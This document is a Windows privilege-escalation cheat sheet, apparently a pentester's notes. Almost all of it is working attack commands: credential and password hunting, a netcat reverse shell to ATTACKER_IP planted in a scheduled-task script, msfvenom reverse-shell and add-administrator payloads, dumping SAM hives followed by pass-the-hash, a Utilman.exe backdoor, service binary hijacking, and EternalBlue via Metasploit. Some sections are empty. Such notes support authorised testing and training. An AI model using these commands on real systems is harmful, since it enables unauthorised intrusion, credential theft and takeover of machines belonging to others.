# Windows Privilege Esclations

## Table of contents

##### ➤ Internal Enumeration
* [0. Display hidden forlder](#Display-hidden-folder)
* [1. Manual enumeration](#Manual-enumeration)
* [2. Search Cleartext Passwords](#Search-cleartext-passwords)
* [3. Automated tools](#Automated-enumeration)
* [4. Bloodhound](#Bloodhound-enumeration)

##### ➤ Privilege escalation through misconfigurations

* [1. Scheduled tasks method](#Scheduled-tasks-method)
* [2. AlwaysInstallElevated method](#AlwaysInstallElevated-method)
* [3. Abusing dangerous privileges](#Abusing-dangerous-privileges)
* [4. Insecure permissions on service executable method](#Insecure-permissions-on-service-executable-method)
* [5. Unquoted service paths method](#Unquoted-service-paths-method)
* [6. Insecure service permissions method](#Insecure-service-permissions-method)
* [7. Insecure Autorun program method](#Insecure-Autorun-program-method)
* [8. Insecure startup/logon/logoff services permissions method](#Insecure-startuplogonlogoff-services-permissions-method)
* [9. DLL Hijacking method](#DLL-Hijacking-method)


##### ➤ Privilege escalation through exploits

* [1. Unpatched software](#Unpatched-software)
* [2. Secondary logon (MS16-032)](#Secondary-logon)
* [3. Eternal Blue (MS17-010)](#Eternal-blue)


``` ```
``` ```
## Manual enumeration

##### ➤ Who
```
whoami
echo %username%
whoami /priv
```

##### ➤ Determine the groups that our account is part of
```
whoami /groups
```

##### ➤ Users and groups
```
➤ What users are on the machine?
net users

➤ What localgroups are on the machine?
net localgroups

➤ More info about a specific user. Check if user has privileges.
net user user1

➤ Determine the users that are part of a specific localgroup
net localgroup <localgroup_name>

➤ View Domain Groups
net group /domain

➤ View Members of Domain Group
net group /domain {Group Name}
```

##### ➤ System info
```
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ver
hostname
```

##### ➤ Patch on the system
```
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

##### ➤ Drives attached to the system
```
wmic logicaldisk get caption
```

##### ➤ Information regarding the processes that are currently running
```
tasklist /SVC
```

##### ➤ Network
```
ipconfig /all
route print
arp -A
```

##### ➤ Determine the services running and their respestive port
```
netstat -ano
```

##### ➤ Enumerate informatio regarding the firewall
```
netsh firewall show state
netsh firewall show config
```

##### ➤ Vulnerable Drivers
```
Some driver might be vulnerable
driverquery
```

##### ➤ Identify antivirus solutions
```
• Detect if Windows Defender is enabled on the machine (Powershell)
get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'

• Detect if Windows Defender is enabled on the machine (Other)
sc query windefend

• Detect third-party antivirus solutions (list the services that running on the system)
sc queryex type=service
```

##### ➤ Search a specific filename
```
dir /b/s proof.txt
```

``` ```
``` ```
## Search Cleartext Passwords

##### ➤ Basic search
```
• Locate the 'password' string in file with commonly used file extensions.
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.doc *.txt *.ini *.config

• Search for specific strings pertaining to services sush as SSH and FTP.
dir /s *pass* == *cred* == *vnc* == *.config*

• Search for passwoords within the registry for specific programs and software.
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

• Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

##### ➤ Powershell history
```
➤ Using cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

➤ Using powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

##### ➤ Saved Windows Credentials
```
➤ List saved credentials
C:\Users\Kiosec>cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=WINPRIVESC\admin
    Type: Domain Password
    User: WINPRIVESC\admin
    
➤ Use credentials founded
C:\Users\kiosec> runas /savecred /user:admin cmd.exe
```

##### ➤ Usual Windows standard file
```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\Unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

##### ➤ Specific tools
```
➤ VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

➤ Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

➤ SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

➤ Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

##### ➤ Search for password in registry
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

##### ➤ IIS Configuration
```
➤ IIS configuration file
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

➤ Using powershell/cmd 
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

``` ```
``` ```
## Automated enumeration

##### ➤ Winpeas :
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

##### ➤ PrivescCheck :
https://github.com/itm4n/PrivescCheck

##### ➤ WES-NG: Windows Exploit Suggester - Next Generation :
https://github.com/bitsadmin/wesng

**Important note :** Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine. Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system. To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

##### ➤ Mestaploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system.

``` ```
``` ```
## Bloodhound enumeration

##### ➤ Install Bloodhound GUI
```
https://www.kalilinux.in/2021/01/install-bloodhound-on-kali-linux.html
```
##### ➤ Install Bloodhound-python
```
pip3 install bloodhound
```
##### ➤ Let's use bloodhound to visualise the domain and look for privilege escalation paths
```
bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -gc <COMPUTERNAME>.<DOMAIN> -c all -ns 10.0.0.1
→ EX:  bloodhound-python -d example.local -u svc-admin -p s3rvice -gc laptop01.example.local -c all -ns 10.0.0.1
```
##### ➤ Upload the JSON file into Bloodhound GUI



``` ```
``` ```
## Scheduled tasks method

##### ➤ Step 01 : Scheduled tasks can be listed from the command line using the schtasks command without any options. 
```
C:\Users\kiosec> schtasks
Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
vulnerable_scheduled_task                N/A                    Ready

Folder: \Microsoft
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
Server Initial Configuration Task        N/A                    Disabled

Folder: \Microsoft\Windows\.NET Framework
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
.NET Framework NGEN v4.0.30319           N/A                    Ready
.NET Framework NGEN v4.0.30319 64        N/A                    Ready
.NET Framework NGEN v4.0.30319 64 Critic N/A                    Disabled
.NET Framework NGEN v4.0.30319 Critical  N/A                    Disabled
```

##### ➤ Step 02 : To retrieve detailed information about any of the services, you can use a command like the following one:
```
C:\Users\kiosec> schtasks /query /tn vulnerable_scheduled_task /fo list /v
Folder: \
HostName:                             WINPRIVESC
TaskName:                             \vulnerable_scheduled_task
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          admin
```

**Note :** "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task. If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the admin user, resulting in a simple privilege escalation. 

##### ➤ Step 03 : Check the file permissions on the executable
```
C:\Users\kiosec> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

**Note :** As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.

##### ➤ Step 04 : Overwrite the vulnerable .bat file and insert a payload (ex: reverse shell)
```
C:\Users\kiosec> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 443 > C:\tasks\schtask.bat
```

##### ➤ Step 05 : Waiting the next time the scheduled task is triggered

##### ➤ Step 05 BIS : Manually run the task (Probably wouldn't be able to start the task in a real scenario)
```
C:\Users\kiosec> schtasks /run /tn vulnerable_scheduled_task
```

``` ```
``` ```
## AlwaysInstallElevated method

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

##### ➤ 1. check the values of these two registry entries (all need to be on 0x1)
```
C:\Users\kiosec> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
C:\Users\kiosec> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Output: AlwaysInstallElevated   REG_DWORD   0x1
```

##### ➤ 2. Generate a MSI file which add our user in the Local Administrators group
```
msfvenom -p windows/adduser USER=lexis PASS=mypassword123! -f msi -o exploit.msi
```

##### ➤ 2 Bis. Generate a MSI file which execute a reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

##### ➤ 3. Upload the MSI file on the victim

##### ➤ 4. Executre the MSI file
```
msiexec /quiet /qn /i C:\Users\victim\Downloads\exploit.msi
```

**Note :**
- /quiet = Suppress any messages to the user during installation
- /qn = No GUI
- /i = Regular (vs. administrative) installation
  
##### ➤ 5. Verify that our user has been added in the localgroup Administrators (main scenario)
```
net localgroup Administrators
```

``` ```
``` ```
## Abusing dangerous privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

List of available priviles on Windows systems : https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
List of expoitable privileges : https://github.com/gtworek/Priv2Admin

##### ➤ 1. List the user's assigned privileges
```
C:\Users\kiosec> whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Important note :** The status Enabled is not systematically required in order to perform the attacks.


##### ➤ 2. SeBackup / SeRestore privileges

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

##### Example of attack steps
```
➤ backup the SAM and SYSTEM hashes
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

➤ Copy hashes to our attacker machine

➤ Retrieve users' password hashard using impacket
kiosec@attackerlab$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL

➤ Perfom PassTheHash attack using administrator's hash
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes <HASH> administrator@10.0.0.1
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
```

##### ➤ 3. SeTakeOwnershipPrivileges

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable.

##### Example of attack steps - Ultiman.exe
```
➤ Taking ownership on the executable
C:\> takeown /f C:\Windows\System32\Utilman.exe
SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "VULNWINMACHINE\kiosec".

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need.

➤ Give you full permissions
C:\> icacls C:\Windows\System32\Utilman.exe /grant kiosec:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

➤ Replace utilman.exe with a copy of cmd.exe
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

➤ Lock the account session, then click on the "Ease of Access" button (on the left of the shutdown button), which runs utilman.exe with SYSTEM privileges.
```

##### SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

##### Example of attack steps :RogueWinRM
```
```

``` ```
``` ```
## Insecure permissions on service executable method

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

##### ➤ 1. List the services 
```
```

##### ➤ 2. Query a specific service configuration 
```
C:\Users\kiosec> sc qc vulnerable_service
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vulnerable_service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\VService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcadmin
```

**Note :** PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

##### ➤ 3. Check the permissions on the executable associated to the service (Binary_Path_Name)
```
C:\Users\kiosec>icacls C:\PROGRA~2\SYSTEM~1\VService.exe
C:\PROGRA~2\SYSTEM~1\VService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Note :** The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

##### ➤ 4. Generate an exe-service payload using msfvenom (reverse shell)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe-service -o reverse-shell.exe
```

##### ➤ 5. Upload the reverse shell on the victim's asset

##### ➤ 6. Create the listener on the attacker's asset

##### ➤ 7. Replace the service executable with our payload

**Note :** Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group.

```
C:\Users\kiosec> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move VService.exe VService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\reverse-shell.exe VService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls VService.exe /grant Everyone:F
        Successfully processed 1 files.
```

 ##### ➤ 8. Restart the service

**Note :** in a normal scenario, you would likely have to wait for a service restart

```
C:\Users\kiosec> sc stop windowsscheduler
C:\Users\kiosec> sc start windowsscheduler
```

``` ```
``` ```
## Unquoted service paths method

##### ➤ 0. Explanation
Windows would try to locate and execute programs in the following order:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

##### ➤ 1. Find Services With Unquoted Paths
• Using sc
```
sc query
sc qc service name
```
• Using WMIC
```
wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\" |findstr /i /v """
```

##### ➤ 2. Look for Binary_path_name (Binary with space) and for each of them, check if the path is unquoted ('').
Vulnerable example: C:\Program Files\Some Folder\Service.exe

##### ➤ 3. Verify that we can write into one of the subfolder
```
icacls "C:\Program Files\Some Folder\"
```

##### ➤ 4. Create a reverse shell named Some.exe in 'C:\Program Files\Some Folder\'

##### ➤ 5. Restart the service linked with service.exe
```
sc stop vulnerable_service
sc start vulnerable_service
```

``` ```
``` ```
## Insecure service permissions method

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

##### ➤ 1. To check for a service DACL from the command line, you can use Accesschk
```
➤ For a specific service name
C:\tools\AccessChk> accesschk64.exe -qlc <SERVICENAME>
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

➤ All services for a specific user
C:\tools\AccessChk> accesschk64.exe -uwcqv "<USERNAME>" * -accepteula

➤ For all services
C:\tools\AccessChk> accesschk64.exe -qlc *
```

##### ➤ 2. Detect the user group that can reconfigure the service
```
    [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

##### ➤ 3. Create a reverse-shell (exe-service)
```
kiosec@seculab$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8083 -f exe-service -o vuln-svc.exe
```

##### ➤ 4. Create a listener
```
kiosec@seculab$ nc -lvp 8083
```

##### ➤ 5. Transfer the reverse shell (vuln-svc.exe) to the victim asset

##### ➤ 6. Grant permissions to Everyone to execute your payload
```
C:\> icacls C:\Users\unpriv\vuln-svc.exe /grant Everyone:F
```

##### ➤ 7. Change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
```
C:\> sc config VUNLService binPath= "C:\Users\tmp\vuln-svc.exe" obj= LocalSystem
```

##### ➤ 8. To trigger the payload, restart the service
```
C:\> sc stop VULNService
C:\> sc start VULNService
```


``` ```
``` ```
## Insecure Autorun program method
Autorun is a Windows feature that is used to automatically start applications and programs during system startup.

**Note :** Autorun feature is disabled by default in newer versions such as Windows 10.

##### ➤ 1. Identify Auturun applications on the target system 
```
#Display the list of Autorun applications
re query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
```
OR
```
#Display the list of Autorun applications, their access permissions and their respective directories
.\accesschk64.exe -wvu "C:\Program Files\ Autorun Program"
```

**Note :** The applications are located into "C:\Program Files\Autorun Program\xxxx.exe

##### ➤ 2. Identify the access permissions on the Autorun program
```
Example :
    - "RW EVERYONE" -> Everyone can read and modify the service
```

##### ➤ 3. Create a reverse shell (e.g., msfvenom .exe) and upload it on the victim machine

##### ➤ 4. Rename the original binary (vuln service) or simply take a backup
```
mv vuln-program.exe vuln-program_backup.exe
```

``` ```
``` ```
## Insecure startup/logon/logoff services permissions method

##### ➤ 1. Execute Auturuns.exe (Sysinternals) and identify the programs and scripts running at the startup, logon and logoff

##### ➤ 2. identify the programs and scripts running at the startup, logon and logoff
```
• In the menu click on everything (default dashboard when auturuns is executed)

• Detect the files in the following parts:
- HKCU\Software\Micrisoft\Windows\CurrentVersion\Group Policy\Scripts\Logon
- HKCU\Software\Micrisoft\Windows\CurrentVersion\Group Policy\Scripts\Logoff
- HKCU\Software\Micrisoft\Windows\CurrentVersion\Group Policy\Scripts\Startup
- ...
```


##### ➤ 2. identify the programs and scripts running at the startup, logon and logoff
```
• If the ligne is yellow with "File not found: xxx.xxx", the file is not present in the system. In this case, the objective is to create a malicious version of the missing file (msfvenom) and upload it in the directory.
    1. Verify that you can write into the folder listed in Autoruns (e.g., File not found: \\10.0.0.1\wsus\wsusdetectpost.bat)
    2. If the program is .bat, create directly a file .bat with your payload (e.g., create a new user, add the user to admin group, extract creds, etc.)
    3. If the program is .exe, craft a malicous version with msfvenom
    4. In both case, the malicious version should be uploaded in the folder listed in Autoruns (e.g., File not found: \\10.0.0.1\wsus\wsusdetectpost.bat)
    5. Depending the part, restart the laptop or logoff/logon in order to execute the payload

• If the ligne is red with "(Not verified)", the file is present on the system but the signature is not verify. In this case, the objective is to modify the file in order to execute our payload or simply replace the script by a new one. The steps are pretty similar than above. The most important is to verify that it is possible to write into the folder and/or modify the scripts.
```

``` ```
``` ```
## DLL Hijacking method
Windows DLLs are libraries that are used or claled whn applications or service are started. if the applications or service cannot locate the required DLLs, we can force the application or service to load our own DLL that will run arbitrary commands. in order to do this, we first locate an application that runs wirh SYSTEM privileges and have the appropriate PATH permissions that can allow us to upload our custom DLL.

The typically pathis are :
1. Application path or directory
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. C:\Program Files
6. The PATH environment variable

In the case of no absolute PATH has been defined.
Example of absolute PATH : PATH = C:\Windows\System32\abc.dll (The application or service knows exactly where to locate it)
Example of undefined service DLL : PATH = abc.dll  (The application or service doesn't know exactly where to locate it)

##### ➤ 1. Identification of the applications or service with missing DLLs
```
Use the WinPEAS tools (ex: .\winPEASx64.exe servicesinfo)
or
Use the Sysinternals Procmon tool (ex: filter on value "NAME NOT FOUND" and display ".dll")
or
Use the Autoruns tool (sysinternals)
```

##### ➤ 2. Generate a malicious .dll reverse shell (msfvenom)

##### ➤ 3. Upload the malicious .dll under the respective service PATH

##### ➤ 1. Restart the service to execute the associated .dll
```
sc stop <SERVICE>
sc start >SERVICE>
```

**Note :** in a normal scenario, you would likely have to wait for a service restart (or restart the laptop for a service execution at the start up)

``` ```
``` ```
## Unpatched software

##### ➤ 1. List the tools installed and the version
```
C:\Users\kiosec> wmic product get name,version,vendor
```

**Important note :** The command wmic product may not return all installed programs. Depending on how some of the programs were installed, they might not get listed. It is always required to double check with the 'add delete native windows services' as well as the desktop shortcuts and available services.

##### ➤ 2. Check the existing exploits linked with the installed versions
https://www.exploit-db.com/
https://packetstormsecurity.com/
https://fr.0day.today/
https://cxsecurity.com/exploit/
https://www.rapid7.com/db/
Google search

``` ```
``` ```
## Secondary Logon
The following versions of Windows are affected :
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10

**Important note :** The exploit requires certain dependencies to work : the target system should have two or more CPU cores and the should be running Powershell V2.0 or later.

##### ➤ 1. Metasploit exploit 
exploit/windows/local/ms16_032_secondary_logon_handle_privesc

##### ➤ 2. Manual exploit
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032


``` ```
``` ```
## Eternal Blue

#### Detect the vulnerability

Using Nmap
```
nmap -sC -sV --script vuln <ip>
<...>
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
<...>
```

Using metasploit
```
use auxiliary/scanner/smb/smb_ms17_010
```

#### Exploitation

Using metasploit

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set processname svchost.exe
set RHOSTS <Target_IP>
set LHOST <Attacker_IP>
```
